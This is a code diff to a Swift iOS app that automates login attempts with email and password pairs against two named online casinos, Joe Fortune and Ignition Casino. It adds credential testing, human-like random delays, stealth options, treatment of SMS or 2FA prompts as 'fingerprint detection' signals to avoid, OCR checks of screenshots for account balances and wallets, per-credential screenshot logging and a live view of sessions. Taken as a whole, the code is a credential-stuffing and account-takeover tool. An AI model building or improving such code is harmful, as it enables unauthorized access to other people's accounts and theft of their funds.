@@ -3,6 +3,8 @@ import Observation
 import SwiftUI
 import UserNotifications
 import UIKit
+import Vision
+import WebKit
 
 @Observable
 @MainActor
@@ -41,7 +43,14 @@ class DualFindViewModel {
     var interventionUnsureCount: Int = 0
     var interventionAutoHealCount: Int = 0
 
+    var screenshotMode: DualFindScreenshotMode = .one
+    var screenshotsCapturedCount: Int = 0
+    var showLiveView: Bool = false
+    var liveViewSessionIndex: Int = 0
+    var liveViewSite: LoginTargetSite = .joefortune
+
     let interventionLearning = UserInterventionLearningService.shared
+    private let screenshotManager = UnifiedScreenshotManager.shared
 
     var appearanceMode: AppAppearanceMode = .dark
     var stealthEnabled: Bool = true
@@ -448,6 +457,7 @@ class DualFindViewModel {
             }
 
             await session.clearEmailFieldOnly()
+            await session.blurActiveElement()
             try? await Task.sleep(for: .milliseconds(100))
 
             let cal = getCalibration(site: site, index: sessionIndex)
@@ -459,8 +469,13 @@ class DualFindViewModel {
                     _ = await session.fillUsername(email)
                 }
             }
+            await session.blurActiveElement()
+
+            await captureScreenshotIfNeeded(session: session, step: .postTyping, email: email, site: site, attemptNumber: passwordIndex + 1)
 
             try? await Task.sleep(for: .milliseconds(Int.random(in: 100...300)))
+
+            await captureScreenshotIfNeeded(session: session, step: .preClick, email: email, site: site, attemptNumber: passwordIndex + 1)
 
             let calForBtn = getCalibration(site: site, index: sessionIndex)
             let submitResult = await session.clickLoginButtonCalibrated(calibration: calForBtn)
@@ -470,10 +485,15 @@ class DualFindViewModel {
                     _ = await session.pressEnterOnPasswordField()
                 }
             }
+            await session.blurActiveElement()
+
+            await captureScreenshotIfNeeded(session: session, step: .postClick, email: email, site: site, attemptNumber: passwordIndex + 1)
 
             try? await Task.sleep(for: .seconds(6))
 
             var outcome = await evaluateResponseWithTimeout(session: session, timeout: 10)
+
+            await captureScreenshotIfNeeded(session: session, step: .finalState, email: email, site: site, attemptNumber: passwordIndex + 1)
 
             if outcome == .unsure {
                 let pageContent = await session.getPageContent() ?? ""
@@ -712,64 +732,137 @@ class DualFindViewModel {
         return result
     }
 
+    private static let ignitionErrorBannerKeywords: [String] = [
+        "unable to log in", "session expired", "temporarily unavailable",
+        "account locked", "technical difficulties", "service unavailable",
+        "try again later", "something went wrong", "unexpected error",
+        "system error", "connection error", "server error",
+        "access denied", "maintenance", "currently unavailable"
+    ]
+
+    private static let incorrectMarkers: [String] = [
+        "incorrect password", "invalid credentials", "wrong password",
+        "invalid email or password", "login failed", "authentication failed",
+        "no account found", "account not found", "invalid email", "invalid username",
+        "email/password combination is incorrect", "does not match", "not recognized",
+        "check your credentials", "please try again", "unable to verify"
+    ]
+
     private func evaluateResponse(session: LoginSiteWebSession) async -> DualFindTestOutcome {
         let pageContent = await session.getPageContent() ?? ""
         let contentLower = pageContent.lowercased()
         let currentURL = await session.getCurrentURL()
         let urlLower = currentURL.lowercased()
 
-        let successMarkers = ["balance", "wallet", "my account", "logout", "dashboard", "deposit"]
-        for marker in successMarkers {
-            if contentLower.contains(marker) && !urlLower.contains("/login") && !urlLower.contains("/signin") {
-                return .success
-            }
-        }
-
-        if !urlLower.contains("/login") && !urlLower.contains("/signin") && !urlLower.contains("error") {
-            for marker in ["balance", "wallet", "my account", "logout"] {
-                if contentLower.contains(marker) {
-                    return .success
-                }
-            }
-            let tdValidation = await session.trueDetectionValidateSuccess()
-            if tdValidation.success {
-                return .success
-            }
-        }
-
-        if contentLower.contains("disabled") || contentLower.contains("account is disabled") || contentLower.contains("temporarily disabled") {
-            return .disabled
-        }
-
-        // Anti-Fingerprinting: ANY SMS/2FA response = fingerprint detection (Burn signal)
-        for keyword in Self.fingerprintDetectionKeywords {
-            if contentLower.contains(keyword) {
-                return .fingerprintDetected
-            }
-        }
-
-        if contentLower.contains("error") && !contentLower.contains("incorrect") && !contentLower.contains("invalid") && !contentLower.contains("wrong") {
-            return .transient
-        }
+        let isOnLoginPage = urlLower.contains("/login") || urlLower.contains("/signin") || urlLower.contains("overlay=login")
 
         if pageContent.trimmingCharacters(in: .whitespacesAndNewlines).count < 30 {
             return .transient
         }
 
-        let incorrectMarkers = ["incorrect password", "invalid credentials", "wrong password",
-                                "invalid email or password", "login failed", "authentication failed",
-                                "no account found", "account not found", "invalid email", "invalid username"]
-        for marker in incorrectMarkers {
+        let hasLoginForm = contentLower.contains("input type=\"password\"") || contentLower.contains("type=\"password\"") || contentLower.contains("password") && contentLower.contains("email") && isOnLoginPage
+        if hasLoginForm && isOnLoginPage && contentLower.count < 200 {
+            return .transient
+        }
+
+        if contentLower.contains("account is disabled") || contentLower.contains("account has been disabled") ||
+           contentLower.contains("permanently disabled") || contentLower.contains("account is locked") ||
+           contentLower.contains("account has been locked") {
+            return .disabled
+        }
+        if contentLower.contains("temporarily disabled") || contentLower.contains("temporarily locked") {
+            return .disabled
+        }
+
+        for marker in Self.incorrectMarkers {
             if contentLower.contains(marker) {
                 return .noAccount
             }
         }
 
-        if urlLower.contains("/login") || urlLower.contains("/signin") || urlLower.contains("overlay=login") {
+        for keyword in Self.ignitionErrorBannerKeywords {
+            if contentLower.contains(keyword) {
+                return .transient
+            }
+        }
+
+        if contentLower.contains("error") && !contentLower.contains("incorrect") && !contentLower.contains("invalid") && !contentLower.contains("wrong") {
+            if isOnLoginPage {
+                return .transient
+            }
+        }
+
+        let hasSuccessMarker = ["balance", "wallet", "my account", "logout", "dashboard", "deposit"].contains(where: { contentLower.contains($0) })
+
+        let hasSMSKeyword = Self.fingerprintDetectionKeywords.contains(where: { contentLower.contains($0) })
+        if hasSMSKeyword && !hasSuccessMarker {
+            return .fingerprintDetected
+        }
+
+        if hasSuccessMarker && !isOnLoginPage {
+            let visionConfirmed = await visionVerifySuccess(session: session)
+            if visionConfirmed {
+                return .success
+            }
+            let tdValidation = await session.trueDetectionValidateSuccess()
+            if tdValidation.success {
+                return .success
+            }
+            return .unsure
+        }
+
+        if !isOnLoginPage {
+            let tdValidation = await session.trueDetectionValidateSuccess()
+            if tdValidation.success {
+                let visionConfirmed = await visionVerifySuccess(session: session)
+                if visionConfirmed {
+                    return .success
+                }
+            }
+        }
+
+        if isOnLoginPage {
+            if hasLoginForm {
+                return .noAccount
+            }
             return .unsure
         }
 
         return .noAccount
+    }
+
+    private func visionVerifySuccess(session: LoginSiteWebSession) async -> Bool {
+        guard let screenshot = await session.captureScreenshot(),
+              let cgImage = screenshot.cgImage else { return true }
+
+        let request = VNRecognizeTextRequest()
+        request.recognitionLevel = .fast
+        request.usesLanguageCorrection = false
+        let handler = VNImageRequestHandler(cgImage: cgImage, options: [:])
+        do {
+            try handler.perform([request])
+        } catch {
+            return true
+        }
+
+        guard let observations = request.results else { return true }
+        let allText = observations.compactMap { $0.topCandidates(1).first?.string }.joined(separator: " ").lowercased()
+
+        let errorIndicators = ["unable to log in", "session expired", "error", "try again",
+                               "temporarily unavailable", "incorrect password", "invalid",
+                               "account locked", "technical difficulties", "something went wrong"]
+        let successIndicators = ["balance", "wallet", "my account", "logout", "dashboard", "deposit", "welcome"]
+
+        let errorCount = errorIndicators.filter { allText.contains($0) }.count
+        let successCount = successIndicators.filter { allText.contains($0) }.count
+
+        if errorCount > 0 && successCount == 0 {
+            return false
+        }
+        if successCount >= 2 {
+            return true
+        }
+        return successCount > errorCount
     }
 
     // MARK: - Retry on Fresh Session
@@ -836,6 +929,7 @@ class DualFindViewModel {
 
     private func retryEmailOnFreshSession(session: LoginSiteWebSession, email: String, password: String, site: LoginTargetSite, sessionIndex: Int, label: String) async -> DualFindTestOutcome {
         await session.clearEmailFieldOnly()
+        await session.blurActiveElement()
         try? await Task.sleep(for: .milliseconds(100))
 
         let cal = getCalibration(site: site, index: sessionIndex)
@@ -846,6 +940,7 @@ class DualFindViewModel {
                 _ = await session.fillUsername(email)
             }
         }
+        await session.blurActiveElement()
 
         try? await Task.sleep(for: .milliseconds(Int.random(in: 100...300)))
 
@@ -856,10 +951,13 @@ class DualFindViewModel {
                 _ = await session.pressEnterOnPasswordField()
             }
         }
+        await session.blurActiveElement()
 
         try? await Task.sleep(for: .seconds(6))
 
-        return await evaluateResponseWithTimeout(session: session, timeout: 10)
+        let outcome = await evaluateResponseWithTimeout(session: session, timeout: 10)
+        await captureScreenshotIfNeeded(session: session, step: .finalState, email: email, site: site, attemptNumber: 0)
+        return outcome
     }
 
     // MARK: - Persistent Session Management
@@ -1126,6 +1224,66 @@ class DualFindViewModel {
         content.sound = .defaultCritical
         let request = UNNotificationRequest(identifier: UUID().uuidString, content: content, trigger: nil)
         UNUserNotificationCenter.current().add(request)
+    }
+
+    // MARK: - Screenshot Capture
+
+    private func captureScreenshotIfNeeded(session: LoginSiteWebSession, step: ScreenshotStep, email: String, site: LoginTargetSite, attemptNumber: Int) async {
+        let mode = screenshotMode
+        guard mode != .none else { return }
+
+        let shouldCapture: Bool
+        switch step {
+        case .pageLoad: shouldCapture = mode.capturesPageLoad
+        case .postTyping: shouldCapture = mode.capturesPostFill
+        case .preClick: shouldCapture = mode.capturesPreClick
+        case .postClick: shouldCapture = mode.capturesPostClick
+        case .finalState, .responseDetected: shouldCapture = mode.capturesFinalResponse
+        default: shouldCapture = false
+        }
+        guard shouldCapture else { return }
+
+        guard let image = await session.captureScreenshot() else { return }
+        let siteName = site == .joefortune ? "Joe Fortune" : "Ignition Casino"
+        await screenshotManager.addScreenshot(
+            image: image,
+            sessionId: "dualfind_\(site.rawValue)",
+            credentialEmail: email,
+            site: siteName,
+            step: step,
+            attemptNumber: attemptNumber,
+            runVisionAnalysis: true
+        )
+        screenshotsCapturedCount += 1
+    }
+
+    // MARK: - Live View
+
+    func liveViewWebView() -> WKWebView? {
+        getPersistentSession(site: liveViewSite, index: liveViewSessionIndex)?.webView
+    }
+
+    func openLiveView(site: LoginTargetSite, index: Int) {
+        liveViewSite = site
+        liveViewSessionIndex = index
+        showLiveView = true
+    }
+
+    func liveViewSessionLabel() -> String {
+        let siteLabel = liveViewSite == .joefortune ? "JOE" : "IGN"
+        return "\(siteLabel)-\(liveViewSessionIndex + 1)"
+    }
+
+    func liveViewCurrentEmail() -> String {
+        let platformName = liveViewSite == .joefortune ? "Joe Fortune" : "Ignition Casino"
+        let sessionId = "\(platformName)_\(liveViewSessionIndex)"
+        return sessions.first(where: { $0.id == sessionId })?.currentEmail ?? ""
+    }
+
+    func liveViewCurrentStatus() -> String {
+        let platformName = liveViewSite == .joefortune ? "Joe Fortune" : "Ignition Casino"
+        let sessionId = "\(platformName)_\(liveViewSessionIndex)"
+        return sessions.first(where: { $0.id == sessionId })?.status ?? "Idle"
     }
 
     // MARK: - Logging
